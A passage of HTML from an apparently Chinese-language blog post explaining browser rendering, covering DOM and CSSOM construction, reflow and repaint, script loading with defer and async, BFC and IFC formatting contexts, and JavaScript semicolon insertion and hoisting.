&lt;div&gt;&lt;img src=&quot;awesome-photo.jpg&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>浏览器的处理如下：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596829219-ed51e09e-6e56-4557-a6b4-fd2362c2b401.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596829219-ed51e09e-6e56-4557-a6b4-fd2362c2b401.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />列举其中的一些重点过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. Conversion转换：浏览器将获得的HTML内容（Bytes）基于他的编码转换为单个字符</span><br><span class="line">2. Tokenizing分词：浏览器按照HTML规范标准将这些字符转换为不同的标记token。每个token都有自己独特的含义以及规则集</span><br><span class="line">3. Lexing词法分析：分词的结果是得到一堆的token，此时把他们转换为对象，这些对象分别定义他们的属性和规则</span><br><span class="line">4. DOM构建：因为HTML标记定义的就是不同标签之间的关系，这个关系就像是一个树形结构一样</span><br><span class="line">例如：body对象的父节点就是HTML对象，然后段略p对象的父节点就是body对象</span><br></pre></td></tr></table></figure><p>最后的 DOM 树如下：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596831267-4bc2c7b3-2682-4e30-b451-07de0442957b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596831267-4bc2c7b3-2682-4e30-b451-07de0442957b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="section-13-3"></a></p><h3 id="生成-CSS-规则"><a href="#生成-CSS-规则" class="headerlink" title="生成 CSS 规则"></a>生成 CSS 规则</h3><p>同理，CSS 规则树的生成也是类似。简述为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bytes → characters → tokens → nodes → CSSOM</span><br></pre></td></tr></table></figure><p>譬如<code>style.css</code>内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">body &#123; font-size: 16px &#125;</span><br><span class="line">p &#123; font-weight: bold &#125;</span><br><span class="line">span &#123; color: red &#125;</span><br><span class="line">p span &#123; display: none &#125;</span><br><span class="line">img &#123; float: right &#125;</span><br></pre></td></tr></table></figure><p>那么最终的 CSSOM 树就是：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596830151-b1681a32-9be9-4ff5-aa0a-89396221a409.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596830151-b1681a32-9be9-4ff5-aa0a-89396221a409.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="section-13-4"></a></p><h3 id="构建渲染树"><a href="#构建渲染树" class="headerlink" title="构建渲染树"></a>构建渲染树</h3><p>当 DOM 树和 CSSOM 都有了后，就要开始构建渲染树了<br />一般来说，渲染树和 DOM 树相对应的，但不是严格意义上的一一对应<br />因为有一些不可见的 DOM 元素不会插入到渲染树中，如 head 这种不可见的标签或者<code>display: none</code>等<br />整体来说可以看图：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596827869-e6ad6b79-a912-4bbd-ad09-af1cb6b9c96b.png#height=420&id=eOPtP&originHeight=420&originWidth=900&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=900" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596827869-e6ad6b79-a912-4bbd-ad09-af1cb6b9c96b.png#height=420&id=eOPtP&originHeight=420&originWidth=900&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=900" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="section-13-5"></a></p><h3 id="渲染"><a href="#渲染" class="headerlink" title="渲染"></a>渲染</h3><p>有了 render 树，接下来就是开始渲染，基本流程如下：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/jpeg/164572/1588596831489-075f87dd-2cbe-4e92-af49-1bf03b96befa.jpeg" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/jpeg/164572/1588596831489-075f87dd-2cbe-4e92-af49-1bf03b96befa.jpeg" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />图中重要的四个步骤就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 计算CSS样式</span><br><span class="line">2. 构建渲染树</span><br><span class="line">3. 布局，主要定位坐标和大小，是否换行，各种position overflow z-index属性</span><br><span class="line">4. 绘制，将图像绘制出来</span><br></pre></td></tr></table></figure><p>然后，图中的线与箭头代表通过 js 动态修改了 DOM 或 CSS，导致了重新布局（Layout）或渲染（Repaint）<br />这里 Layout 和 Repaint 的概念是有区别的：</p><ul><li>Layout，也称为 Reflow，即回流。一般意味着元素的内容、结构、位置或尺寸发生了变化，需要重新计算样式和渲染树</li><li>Repaint，即重绘。意味着元素发生的改变只是影响了元素的一些外观之类的时候（例如，背景色，边框颜色，文字颜色等），此时只需要应用新样式绘制这个元素就可以了</li></ul><p>回流的成本开销要高于重绘，而且一个节点的回流往往回导致子节点以及同级节点的回流， 所以优化方案中一般都包括，尽量避免回流。<br /><strong>什么会引起回流？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.页面渲染初始化</span><br><span class="line">2.DOM结构改变，比如删除了某个节点</span><br><span class="line">3.render树变化，比如减少了padding</span><br><span class="line">4.窗口resize</span><br><span class="line">5.最复杂的一种：获取某些属性，引发回流，</span><br><span class="line">很多浏览器会对回流做优化，会等到数量足够时做一次批处理回流，</span><br><span class="line">但是除了render树的直接变化，当获取一些属性时，浏览器为了获得正确的值也会触发回流，这样使得浏览器优化无效，包括</span><br><span class="line">    （1）offset(Top/Left/Width/Height)</span><br><span class="line">     (2) scroll(Top/Left/Width/Height)</span><br><span class="line">     (3) cilent(Top/Left/Width/Height)</span><br><span class="line">     (4) width,height</span><br><span class="line">     (5) 调用了getComputedStyle()或者IE的currentStyle</span><br></pre></td></tr></table></figure><p>回流一定伴随着重绘，重绘却可以单独出现<br />所以一般会有一些优化方案，如：</p><ul><li>减少逐项更改样式，最好一次性更改 style，或者将样式定义为 class 并一次性更新</li><li>避免循环操作 dom，创建一个 documentFragment 或 div，在它上面应用所有 DOM 操作，最后再把它添加到 window.document</li><li>避免多次读取 offset 等属性。无法避免则将它们缓存到变量</li><li>将复杂的元素绝对定位或固定定位，使得它脱离文档流，否则回流代价会很高</li></ul><p><strong>注意：改变字体大小会引发回流</strong><br />再来看一个示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var s = document.body.style;</span><br><span class="line">s.padding = &quot;2px&quot;; // 回流+重绘</span><br><span class="line">s.border = &quot;1px solid red&quot;; // 再一次 回流+重绘</span><br><span class="line">s.color = &quot;blue&quot;; // 再一次重绘</span><br><span class="line">s.backgroundColor = &quot;#ccc&quot;; // 再一次 重绘</span><br><span class="line">s.fontSize = &quot;14px&quot;; // 再一次 回流+重绘</span><br><span class="line">// 添加node，再一次 回流+重绘</span><br><span class="line">document.body.appendChild(document.createTextNode(&#x27;abc!&#x27;));</span><br></pre></td></tr></table></figure><p><a name="section-13-6"></a></p><h3 id="简单层与复合层"><a href="#简单层与复合层" class="headerlink" title="简单层与复合层"></a>简单层与复合层</h3><p>上述中的渲染中止步于绘制，但实际上绘制这一步也没有这么简单，它可以结合复合层和简单层的概念来讲。<br />这里不展开，进简单介绍下：</p><ul><li>可以认为默认只有一个复合图层，所有的 DOM 节点都是在这个复合图层下的</li><li>如果开启了硬件加速功能，可以将某个节点变成复合图层</li><li>复合图层之间的绘制互不干扰，由 GPU 直接控制</li><li>而简单图层中，就算是 absolute 等布局，变化时不影响整体的回流，但是由于在同一个图层中，仍然是会影响绘制的，因此做动画时性能仍然很低。而复合层是独立的，所以一般做动画推荐使用硬件加速</li></ul><p>更多参考：<br /><a href="https://segmentfault.com/a/1190000012925872#articleHeader16">普通图层和复合图层</a><br><a name="section-13-7"></a></p><h3 id="Chrome-中的调试"><a href="#Chrome-中的调试" class="headerlink" title="Chrome 中的调试"></a>Chrome 中的调试</h3><p>Chrome 的开发者工具中，Performance 中可以看到详细的渲染过程：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596829910-21624730-fe55-4792-93f0-d3ad6b197c63.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596829910-21624730-fe55-4792-93f0-d3ad6b197c63.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="section-13-8"></a></p><h3 id="资源外链的下载"><a href="#资源外链的下载" class="headerlink" title="资源外链的下载"></a>资源外链的下载</h3><p>上面介绍了 html 解析，渲染流程。但实际上，在解析 html 时，会遇到一些资源连接，此时就需要进行单独处理了<br />简单起见，这里将遇到的静态资源分为一下几大类（未列举所有）：</p><ul><li>CSS 样式资源</li><li>JS 脚本资源</li><li>img 图片类资源</li></ul><p><strong>遇到外链时的处理</strong><br />当遇到上述的外链时，会单独开启一个下载线程去下载资源（http1.1 中是每一个资源的下载都要开启一个 http 请求，对应一个 tcp&#x2F;ip 链接）<br /><strong>遇到 CSS 样式资源</strong><br />CSS 资源的处理有几个特点：</p><ul><li>CSS 下载时异步，不会阻塞浏览器构建 DOM 树</li><li>但是会阻塞渲染，也就是在构建 render 时，会等到 css 下载解析完毕后才进行（这点与浏览器优化有关，防止 css 规则不断改变，避免了重复的构建）</li><li>有例外，<code>media query</code>声明的 CSS 是不会阻塞渲染的</li></ul><p><strong>遇到 JS 脚本资源</strong><br />JS 脚本资源的处理有几个特点：</p><ul><li>阻塞浏览器的解析，也就是说发现一个外链脚本时，需等待脚本下载完成并执行后才会继续解析 HTML</li><li>浏览器的优化，一般现代浏览器有优化，在脚本阻塞时，也会继续下载其它资源（当然有并发上限），但是虽然脚本可以并行下载，解析过程仍然是阻塞的，也就是说必须这个脚本执行完毕后才会接下来的解析，并行下载只是一种优化而已</li><li>defer 与 async，普通的脚本是会阻塞浏览器解析的，但是可以加上 defer 或 async 属性，这样脚本就变成异步了，可以等到解析完毕后再执行</li></ul><p>注意，defer 和 async 是有区别的： <strong>defer 是延迟执行，而 async 是异步执行。</strong><br />简单的说（不展开）：</p><ul><li><code>async</code>是异步执行，异步下载完毕后就会执行，不确保执行顺序，一定在<code>onload</code>前，但不确定在<code>DOMContentLoaded</code>事件的前或后</li><li><code>defer</code>是延迟执行，在浏览器看起来的效果像是将脚本放在了<code>body</code>后面一样（虽然按规范应该是在<code>DOMContentLoaded</code>事件前，但实际上不同浏览器的优化效果不一样，也有可能在它后面）</li></ul><p><strong>遇到 img 图片类资源</strong><br />遇到图片等资源时，直接就是异步下载，不会阻塞解析，下载完毕后直接用图片替换原有 src 的地方<br><a name="section-13-9"></a></p><h3 id="loaded-和-domcontentloaded"><a href="#loaded-和-domcontentloaded" class="headerlink" title="loaded 和 domcontentloaded"></a>loaded 和 domcontentloaded</h3><p>简单的对比：</p><ul><li>DOMContentLoaded 事件触发时，仅当 DOM 加载完成，不包括样式表，图片(譬如如果有 async 加载的脚本就不一定完成)</li><li>load 事件触发时，页面上所有的 DOM，样式表，脚本，图片都已经加载完成了<br><a name="section-14"></a></li></ul><h2 id="CSS-的可视化格式模型"><a href="#CSS-的可视化格式模型" class="headerlink" title="CSS 的可视化格式模型"></a>CSS 的可视化格式模型</h2><p><strong>这一部分内容很多参考《精通 CSS-高级 Web 标准解决方案》以及参考来源</strong><br />前面提到了整体的渲染概念，但实际上文档树中的元素是按什么渲染规则渲染的，是可以进一步展开的，此部分内容即： <strong>CSS 的可视化格式模型</strong><br />先了解：</p><ul><li>CSS 中规定每一个元素都有自己的盒子模型（相当于规定了这个元素如何显示）</li><li>然后可视化格式模型则是把这些盒子按照规则摆放到页面上，也就是如何布局</li><li>换句话说，盒子模型规定了怎么在页面里摆放盒子，盒子的相互作用等等</li></ul><p>说到底： <strong>CSS 的可视化格式模型就是规定了浏览器在页面中如何处理文档树</strong><br />关键字：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">包含块（Containing Block）</span><br><span class="line">控制框（Controlling Box）</span><br><span class="line">BFC（Block Formatting Context）</span><br><span class="line">IFC（Inline Formatting Context）</span><br><span class="line">定位体系</span><br><span class="line">浮动</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>另外，CSS 有三种定位机制：<code>普通流</code>，<code>浮动</code>，<code>绝对定位</code>，如无特别提及，下文中都是针对普通流中的<br><a name="section-14-1"></a></p><h3 id="包含块（Containing-Block）"><a href="#包含块（Containing-Block）" class="headerlink" title="包含块（Containing Block）"></a>包含块（Containing Block）</h3><p>一个元素的 box 的定位和尺寸，会与某一矩形框有关，这个框就称之为包含块。<br />元素会为它的子孙元素创建包含块，但是，并不是说元素的包含块就是它的父元素，元素的包含块与它的祖先元素的样式等有关系<br />譬如：</p><ul><li>根元素是最顶端的元素，它没有父节点，它的包含块就是初始包含块</li><li>static 和 relative 的包含块由它最近的块级、单元格或者行内块祖先元素的内容框（content）创建</li><li>fixed 的包含块是当前可视窗口</li><li>absolute 的包含块由它最近的 position 属性为<code>absolute</code>、<code>relative</code>或者<code>fixed</code>的祖先元素创建<ul><li>如果其祖先元素是行内元素，则包含块取决于其祖先元素的<code>direction</code>特性</li><li>如果祖先元素不是行内元素，那么包含块的区域应该是祖先元素的内边距边界<br><a name="section-14-2"></a></li></ul></li></ul><h3 id="控制框（Controlling-Box）"><a href="#控制框（Controlling-Box）" class="headerlink" title="控制框（Controlling Box）"></a>控制框（Controlling Box）</h3><p>块级元素和块框以及行内元素和行框的相关概念<br /><strong>块框:</strong></p><ul><li>块级元素会生成一个块框（<code>Block Box</code>），块框会占据一整行，用来包含子 box 和生成的内容</li><li>块框同时也是一个块包含框（<code>Containing Box</code>），里面要么只包含块框，要么只包含行内框（不能混杂），如果块框内部有块级元素也有行内元素，那么行内元素会被匿名块框包围</li></ul><p>关于<strong>匿名块框</strong>的生成，示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;DIV&gt;</span><br><span class="line">Some text</span><br><span class="line">&lt;P&gt;More text</span><br><span class="line">&lt;/DIV&gt;</span><br></pre></td></tr></table></figure><p><code>div</code>生成了一个块框，包含了另一个块框<code>p</code>以及文本内容<code>Some text</code>，此时<code>Some text</code>文本会被强制加到一个匿名的块框里面，被<code>div</code>生成的块框包含（其实这个就是<code>IFC</code>中提到的行框，包含这些行内框的这一行匿名块形成的框，行框和行内框不同）<br />换句话说:<br /><strong>如果一个块框在其中包含另外一个块框，那么我们强迫它只能包含块框，因此其它文本内容生成出来的都是匿名块框（而不是匿名行内框）</strong><br /><strong>行内框：</strong></p><ul><li>一个行内元素生成一个行内框</li><li>行内元素能排在一行，允许左右有其它元素</li></ul><p>关于<strong>匿名行内框</strong>的生成，示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;P&gt;Some &lt;EM&gt;emphasized&lt;/EM&gt; text&lt;/P&gt;</span><br></pre></td></tr></table></figure><p><code>P</code>元素生成一个块框，其中有几个行内框（如<code>EM</code>），以及文本<code>Some</code>，<code>text</code>，此时会专门为这些文本生成匿名行内框<br /><strong>display 属性的影响</strong><br /><code>display</code>的几个属性也可以影响不同框的生成：</p><ul><li><code>block</code>，元素生成一个块框</li><li><code>inline</code>，元素产生一个或多个的行内框</li><li><code>inline-block</code>，元素产生一个行内级块框，行内块框的内部会被当作块块来格式化，而此元素本身会被当作行内级框来格式化（这也是为什么会产生<code>BFC</code>）</li><li><code>none</code>，不生成框，不再格式化结构中，当然了，另一个<code>visibility: hidden</code>则会产生一个不可见的框</li></ul><p>总结：</p><ul><li>如果一个框里，有一个块级元素，那么这个框里的内容都会被当作块框来进行格式化，因为只要出现了块级元素，就会将里面的内容分块几块，每一块独占一行（出现行内可以用匿名块框解决）</li><li>如果一个框里，没有任何块级元素，那么这个框里的内容会被当成行内框来格式化，因为里面的内容是按照顺序成行的排列<br><a name="section-14-3"></a></li></ul><h3 id="BFC（Block-Formatting-Context）"><a href="#BFC（Block-Formatting-Context）" class="headerlink" title="BFC（Block Formatting Context）"></a>BFC（Block Formatting Context）</h3><p>FC（格式上下文）？<br />FC 即格式上下文，它定义框内部的元素渲染规则，比较抽象，譬如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FC像是一个大箱子，里面装有很多元素</span><br><span class="line">箱子可以隔开里面的元素和外面的元素（所以外部并不会影响FC内部的渲染）</span><br><span class="line">内部的规则可以是：如何定位，宽高计算，margin折叠等等</span><br></pre></td></tr></table></figure><p>不同类型的框参与的 FC 类型不同，譬如块级框对应 BFC，行内框对应 IFC<br /><strong>注意，并不是说所有的框都会产生 FC，而是符合特定条件才会产生，只有产生了对应的 FC 后才会应用对应渲染规则</strong><br /><strong>BFC 规则：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在块格式化上下文中</span><br><span class="line">每一个元素左外边与包含块的左边相接触（对于从右到左的格式化，右外边接触右边）</span><br><span class="line">即使存在浮动也是如此（所以浮动元素正常会直接贴近它的包含块的左边，与普通元素重合）</span><br><span class="line">除非这个元素也创建了一个新的BFC</span><br></pre></td></tr></table></figure><p>总结几点 BFC 特点：</p><ol><li>内部<code>box</code>在垂直方向，一个接一个的放置</li><li>box 的垂直方向由<code>margin</code>决定，属于同一个 BFC 的两个 box 间的 margin 会重叠</li><li>BFC 区域不会与<code>float box</code>重叠（可用于排版)</li><li>BFC 就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此</li><li>计算 BFC 的高度时，浮动元素也参与计算（不会浮动坍塌）</li></ol><p>如何触发 BFC？</p><ol><li>根元素</li><li><code>float</code>属性不为<code>none</code></li><li><code>position</code>为<code>absolute</code>或<code>fixed</code></li><li><code>display</code>为<code>inline-block</code>, <code>flex</code>, <code>inline-flex</code>，<code>table</code>，<code>table-cell</code>，<code>table-caption</code></li><li><code>overflow</code>不为<code>visible</code></li></ol><p>这里提下，<code>display: table</code>，它本身不产生 BFC，但是它会产生匿名框（包含<code>display: table-cell</code>的框），而这个匿名框产生 BFC<br />更多请自行网上搜索<br><a name="section-14-4"></a></p><h3 id="IFC（Inline-Formatting-Context）"><a href="#IFC（Inline-Formatting-Context）" class="headerlink" title="IFC（Inline Formatting Context）"></a>IFC（Inline Formatting Context）</h3><p>IFC 即行内框产生的格式上下文<br /><strong>IFC 规则</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在行内格式化上下文中</span><br><span class="line">框一个接一个地水平排列，起点是包含块的顶部。</span><br><span class="line">水平方向上的 margin，border 和 padding 在框之间得到保留</span><br><span class="line">框在垂直方向上可以以不同的方式对齐：它们的顶部或底部对齐，或根据其中文字的基线对齐</span><br></pre></td></tr></table></figure><p><strong>行框</strong><br /><strong>包含那些框的长方形区域，会形成一行，叫做行框</strong><br />行框的宽度由它的包含块和其中的浮动元素决定，高度的确定由行高度计算规则决定<br />行框的规则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果几个行内框在水平方向无法放入一个行框内，它们可以分配在两个或多个垂直堆叠的行框中（即行内框的分割）</span><br><span class="line">行框在堆叠时没有垂直方向上的分割且永不重叠</span><br><span class="line">行框的高度总是足够容纳所包含的所有框。不过，它可能高于它包含的最高的框（例如，框对齐会引起基线对齐）</span><br><span class="line">行框的左边接触到其包含块的左边，右边接触到其包含块的右边。</span><br></pre></td></tr></table></figure><p><strong>结合补充下 IFC 规则：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">浮动元素可能会处于包含块边缘和行框边缘之间</span><br><span class="line">尽管在相同的行内格式化上下文中的行框通常拥有相同的宽度（包含块的宽度），它们可能会因浮动元素缩短了可用宽度，而在宽度上发生变化</span><br><span class="line">同一行内格式化上下文中的行框通常高度不一样（如，一行包含了一个高的图形，而其它行只包含文本）</span><br><span class="line">当一行中行内框宽度的总和小于包含它们的行框的宽，它们在水平方向上的对齐，取决于 `text-align` 特性</span><br><span class="line">空的行内框应该被忽略</span><br><span class="line">即不包含文本，保留空白符，margin/padding/border非0的行内元素，</span><br><span class="line">以及其他常规流中的内容(比如，图片，inline blocks 和 inline tables)，</span><br><span class="line">并且不是以换行结束的行框，</span><br><span class="line">必须被当作零高度行框对待</span><br></pre></td></tr></table></figure><p>总结：</p><ul><li>行内元素总是会应用 IFC 渲染规则</li><li>行内元素会应用 IFC 规则渲染，譬如<code>text-align</code>可以用来居中等</li><li>块框内部，对于文本这类的匿名元素，会产生匿名行框包围，而行框内部就应用 IFC 渲染规则</li><li>行内框内部，对于那些行内元素，一样应用 IFC 渲染规则</li><li>另外，<code>inline-block</code>，会在元素外层产生 IFC（所以这个元素是可以通过<code>text-align</code>水平居中的），当然，它内部则按照 BFC 规则渲染</li></ul><p>相比 BFC 规则来说，IFC 可能更加抽象（因为没有那么条理清晰的规则和触发条件）<br />但总的来说，它就是行内元素自身如何显示以及在框内如何摆放的渲染规则，这样描述应该更容易理解<br><a name="section-14-5"></a></p><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>当然还有有一些其它内容：</p><ul><li>譬如常规流，浮动，绝对定位等区别</li><li>譬如浮动元素不包含在常规流中</li><li>譬如相对定位，绝对定位，<code>Fixed</code>定位等区别</li><li>譬如<code>z-index</code>的分层显示机制等</li></ul><p>这里不一一展开，更多请参考：<br /><a href="http://bbs.csdn.net/topics/340204423">http://bbs.csdn.net/topics/340204423</a><br><a name="section-15"></a></p><h2 id="JS-引擎解析过程"><a href="#JS-引擎解析过程" class="headerlink" title="JS 引擎解析过程"></a>JS 引擎解析过程</h2><p>前面有提到遇到 JS 脚本时，会等到它的执行，实际上是需要引擎解析的，这里展开描述（介绍主干流程）<br><a name="section-15-1"></a></p><h3 id="JS-的解释阶段"><a href="#JS-的解释阶段" class="headerlink" title="JS 的解释阶段"></a>JS 的解释阶段</h3><p>首先得明确： <strong>JS 是解释型语音，所以它无需提前编译，而是由解释器实时运行</strong><br />引擎对 JS 的处理过程可以简述如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 读取代码，进行词法分析（Lexical analysis），然后将代码分解成词元（token）</span><br><span class="line">2. 对词元进行语法分析（parsing），然后将代码整理成语法树（syntax tree）</span><br><span class="line">3. 使用翻译器（translator），将代码转为字节码（bytecode）</span><br><span class="line">4. 使用字节码解释器（bytecode interpreter），将字节码转为机器码</span><br></pre></td></tr></table></figure><p>最终计算机执行的就是机器码。<br />为了提高运行速度，现代浏览器一般采用即时编译（<code>JIT-Just In Time compiler</code>）<br />即字节码只在运行时编译，用到哪一行就编译哪一行，并且把编译结果缓存（<code>inline cache</code>）<br />这样整个程序的运行速度能得到显著提升。<br />而且，不同浏览器策略可能还不同，有的浏览器就省略了字节码的翻译步骤，直接转为机器码（如 chrome 的 v8）<br />总结起来可以认为是： <strong>核心的</strong><code>**JIT**</code><strong>编译器将源码编译成机器码运行</strong><br><a name="section-15-2"></a></p><h3 id="JS-的预处理阶段"><a href="#JS-的预处理阶段" class="headerlink" title="JS 的预处理阶段"></a>JS 的预处理阶段</h3><p>上述将的是解释器的整体过程，这里再提下在正式执行 JS 前，还会有一个预处理阶段 （譬如变量提升，分号补全等）<br />预处理阶段会做一些事情，确保 JS 可以正确执行，这里仅提部分：<br /><strong>分号补全</strong><br />JS 执行是需要分号的，但为什么以下语句却可以正常运行呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">console.log(&#x27;a&#x27;)</span><br><span class="line">console.log(&#x27;b&#x27;)</span><br></pre></td></tr></table></figure><p>原因就是 JS 解释器有一个<a href="http://inimino.org/~inimino/blog/javascript_semicolons">Semicolon Insertion</a>规则，它会按照一定规则，在适当的位置补充分号<br />譬如列举几条自动加分号的规则：</p><ul><li>当有换行符（包括含有换行符的多行注释），并且下一个<code>token</code>没法跟前面的语法匹配时，会自动补分号。</li><li>当有<code>&#125;</code>时，如果缺少分号，会补分号。</li><li>程序源代码结束时，如果缺少分号，会补分号。</li></ul><p>于是，上述的代码就变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">console.log(&#x27;a&#x27;);</span><br><span class="line">console.log(&#x27;b&#x27;);</span><br></pre></td></tr></table></figure><p>所以可以正常运行<br />当然了，这里有一个经典的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function b() &#123;</span><br><span class="line">    return</span><br><span class="line">    &#123;</span><br><span class="line">        a: &#x27;a&#x27;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于分号补全机制，所以它变成了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function b() &#123;</span><br><span class="line">    return;</span><br><span class="line">    &#123;</span><br><span class="line">        a: &#x27;a&#x27;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以运行后是<code>undefined</code><br /><strong>变量提升</strong><br />一般包括函数提升和变量提升<br />譬如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = 1;</span><br><span class="line">b();</span><br><span class="line">function b() &#123;</span><br><span class="line">    console.log(&#x27;b&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">var a;</span><br></pre></td></tr></table></figure><p>经过变量提升后，就变成：</p><figure class="highlight 